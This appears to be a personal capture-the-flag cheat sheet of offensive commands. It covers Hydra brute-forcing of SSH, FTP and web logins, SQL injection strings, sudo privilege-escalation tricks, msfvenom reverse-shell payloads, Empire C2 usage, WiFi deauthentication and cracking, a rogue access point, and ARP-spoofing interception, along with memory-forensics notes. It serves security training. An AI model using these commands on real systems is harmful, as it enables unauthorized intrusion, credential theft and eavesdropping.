# CTF Cheat Sheet

## Commands:

```sudo -l (NOTE: lists commands a user can run as root) ```
    
```echo 10.10.165.196 ice >> /etc/hosts```
    
```mkdir /mnt/kenobiNFS```
```mount machine_ip:/var /mnt/kenobiNFS```
```ls -la /mnt/kenobiNFS```
    
```python -m SimpleHTTPServer [port]```

## Wordlists:

https://wiki.skullsecurity.org/Passwords

https://web.archive.org/web/20120207113205/

http://www.insidepro.com/eng/download.shtml

### Parrot = /usr/share/wordlists

## SSH:
    
```chmod 600 id_rsa```   
    
```ssh -i id_rsa username@{ipaddress}```
    
## NMAP:
    
    nmap -A -p- -vvv {IPAddress}
    
    nmap -A -p- --script vuln -vvv {IPAddress}
    
    nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.39.217
     
    nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.39.217

## smbclient:

```smbclient //<ip>/anonymous```
    
```smbget -R smb://<ip>/anonymous```
    
     
## Research:

GTFO Bins (https://gtfobins.github.io/)
    
## HTTP/HTTPS:

    Ports: 80 = http, 443 = https
    Methods: GET, POST, 
    Status Codes: "100-199 info, 200-299 Successes, 300-399 Redirects, 400-499 Client Errors, 
    500-599 Server errors" Source = https://developer.mozilla.org/en-US/docs/Web/HTTP/Status
    
**Mozilla Firefox:**
        
        F12 = developer tools
        storage = cookies, "+" = add cookies
        https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
        
**cURL:**
        
        curl https://tryhackme.com
        -X specifies the request
        --data specifies POST data
        example: curl http://10.10.75.167:8081/ctf/post -X POST --data flag_please
    
## Linux Priv Esc:

**Enumeration:** https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
    
**Escaping Vi Editor:**
        sudo vi
        :!sh

**/etc/passwd:**
```format example: test:x:0:0:root:/root:/bin/bash```

```username:password (x represents password in /etc/shadow file):user id (UID):Group ID (GID): user id info (comment):home directory: command/shell```


**If Vulnerable to CVE-2019-14287 and has sudo permissions use:**
     	
		sudo -u#-1 /bin/bash

## Generate Password Hash:

```openssl passwd -1 -salt [salt] [password]```

## DIR:
```gobuster dir -u http://<ip>:3333 -w <word list location>```
        
        
## SQL Injection:

    X' or '1'='1' --

    ' or 1='1
    
## John: 

```john --format=NT --rules --pot=lab.pot --progress-every=3 --wordlist=/usr/share/wordlists/rockyou.txt lab.txt```
    
    
    
## Hydra:

```hydra -l {username} -P /usr/share/wordlists/rockyou.txt http-get://{address or ip}:{port}```

```hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp```

```hydra -l user -P passlist.txt ftp://192.168.0.1```

```hydra -l <username> -P <full path to pass> <ip> -t 4 ssh```

```hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.176.160 -t 4 ssh```

```hydra -l -P http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V```

```hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.176.160 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V```
    
    SECTION             FUNCTION

    hydra                   Runs the hydra tool

    -t 4                    Number of parallel connections per target

    -l [user]               Points to the user who's account you're trying to compromise

    -P [path to dictionary] Points to the file containing the list of possible passwords

    -vV                     Sets verbose mode to very verbose, shows the login+pass combination for each attempt

    [machine IP]            The IP address of the target machine

    ftp / protocol          Sets the protocol
    
## Metasploit:

```run post/multi/recon/local_exploit_suggester```
    
```run post/windows/manage/enable_rdprdp```

## MSF Venom:

```msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R```
```msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R echo [MSFVENOM OUTPUT] > "scriptname".sh```
    
    -p = payload
    lhost = our local host IP address
    lport = the port to listen on
    R = export the payload in raw format
    

## PS Empire:

https://www.bc-security.org/post/the-empire-3-0-strikes-back
    
https://github.com/BC-SECURITY/Empire/
    
    COMMANDS:
    
        listeners
        uselistener
        uselistener {tab key}
        uselistener http
        info
        execute
        usestager {tab key}
        agents
        interact
        searchmodule
        
        
## TCPDUMP:

```sudo tcpdump ip proto \\icmp -i interface```
    
## WIFI:

**Crack Wifi Password:**
	
	airmon-ng start wlan0
	airodump-ng mon0
	airodump-ng -c (channel) --bssid (bssid) -w /root/Desktop/ (monitor interface)
	aireplay-ng -0 2 -a (router bssid) -c (client station number) mon0
	aircrack-ng -a2 -b (router bssid) -w (path to wordlist) /Root/Desktop/*.cap

**Create a Fake Network:**
	
	airmon-ng
	airmon-ng start wlan0
	airodump-ng mon0
	airbase-ng -a (router BSSID) --essid "(network name)" -c (channel) mon0
	iwconfig wlan0 txpower 27

    
## Memory DFIR:
### Tools:
**FTK Imager** - https://accessdata.com/product-download/ftk-imager-version-4-2-0
**Redline** - https://www.fireeye.com/services/freeware/redline.html
**DumpIt.exe**
**win32dd.exe / win64dd.exe**
        
Offline machines, however, can have their memory pulled relatively easily as long as their drives aren't encrypted. 
For Windows systems, this can be done via pulling the  following file:     %SystemDrive%/hiberfil.sys
         
    VMware - .vmem file
    Hyper-V - .bin file
    Parallels - .mem file
    VirtualBox - .sav file NOTE: This is only a partial memory file. You'll need to dump memory like a normal bare-metal system for this hypervisor
                
**volatility  (cmd line tool):**
       
                volatility -f MEMORY_FILE.raw imageinfo
                volatility -f MEMORY_FILE.raw --profile=PROFILE pslist
                volatility -f MEMORY_FILE.raw --profile=PROFILE netscan
                volatility -f MEMORY_FILE.raw --profile=PROFILE psxview
                volatility -f MEMORY_FILE.raw --profile=PROFILE ldrmodules
                volatility -f MEMORY_FILE.raw --profile=PROFILE apihooks
                volatility -f MEMORY_FILE.raw --profile=PROFILE malfind -D <Destination Directory>
                volatility -f MEMORY_FILE.raw --profile=PROFILE dlllist
                volatility -f MEMORY_FILE.raw --profile=PROFILE --pid=PID dlldump -D <Destination Directory>
		
## MITM:

    echo 1 > /proc/sys/net/ipv4/ip_forward
    arpspoof -i wlan0 -t (router address) (target computer address)
    arpspoof -i wlan -t (target computer address) (router address)
    urlsnarf -i wlan0
    driftnet -i wlan0

         
